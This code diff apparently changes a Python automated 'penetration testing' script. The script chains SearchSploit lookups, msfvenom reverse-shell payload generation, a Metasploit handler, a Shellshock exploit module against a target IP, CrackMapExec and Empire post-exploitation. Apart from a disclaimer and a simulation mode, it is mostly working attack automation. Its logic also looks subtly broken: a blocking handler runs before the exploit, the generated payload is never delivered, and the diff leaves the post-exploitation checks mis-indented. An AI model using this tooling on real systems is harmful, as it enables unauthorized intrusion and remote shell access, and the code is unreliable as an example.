@@ -60,7 +60,7 @@ def searchsploit_vulnerabilities(service_name, service_version):
     result = subprocess.run(search_command, shell=True, capture_output=True, text=True)
     return result.stdout
 
-# Attempt to exploit a service using Metasploit
+# Attempt to exploit a service using Metasploit with staged payloads
 def attempt_exploit_with_metasploit(service_name, service_version, target_ip):
     print(f"[INFO] Attempting to exploit {service_name} {service_version} on {target_ip}...")
 
@@ -69,16 +69,21 @@ def attempt_exploit_with_metasploit(service_name, service_version, target_ip):
 
     if "Apache" in result.stdout:  # Check if Apache exploit exists in SearchSploit output
         print(f"[INFO] Found exploit for {service_name} {service_version}!")
-        
-        # Metasploit: Generate the payload using msfvenom
+
+        # Metasploit: Generate the staged payload using msfvenom
         payload_command = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf -o /tmp/reverse_shell.elf"
         subprocess.run(payload_command, shell=True)
 
-        # Metasploit: Use msfconsole to run the exploit
-        metasploit_command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST your_ip; set LPORT 4444; exploit'"
-        subprocess.run(metasploit_command, shell=True)
+        # Step 1: Start Metasploit handler for reverse shell connection
+        metasploit_handler_command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST your_ip; set LPORT 4444; run'"
+        subprocess.run(metasploit_handler_command, shell=True)
+        
+        # Step 2: Use Metasploit to launch the exploit (staged payload)
+        metasploit_exploit_command = f"msfconsole -q -x 'use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST {target_ip}; set TARGETURI /cgi-bin/test.cgi; run'"
+        subprocess.run(metasploit_exploit_command, shell=True)
         
         print("[INFO] Exploit attempted, reverse shell initiated.")
+
     else:
         print(f"[INFO] No Metasploit exploit found for {service_name} {service_version}.")
 
@@ -178,29 +183,21 @@ def run_penetration_testing():
     print(f"[INFO] SearchSploit results for {service_name} {service_version}:\n{vulnerabilities}")
 
     if vulnerabilities:
-        print(f"[INFO] Found vulnerabilities. Attempting to exploit...")
         attempt_exploit_with_metasploit(service_name, service_version, target_ip)
-
-    # Run CrackMapExec for SMB if detected
-    if 'smb' in nmap_results.lower():
         run_crackmapexec(target_ip)
-
-    # Run Empire for SSH-based post-exploitation
-    if 'ssh' in nmap_results.lower():
         run_empire_post_exploitation(target_ip)
+    else:
+        print("[INFO] No exploits found for this service version.")
 
-# Main entry point
 def main():
     display_disclaimer()
-
-    mode = input("Select mode: (1) Simulation (2) Penetration Testing: ")
-
+    mode = input("Select Mode (1 for Simulation, 2 for Penetration Testing): ")
     if mode == '1':
         run_simulation()
     elif mode == '2':
         run_penetration_testing()
     else:
-        print("[ERROR] Invalid mode selected.")
+        print("[ERROR] Invalid selection.")
 
 if __name__ == "__main__":
     main()
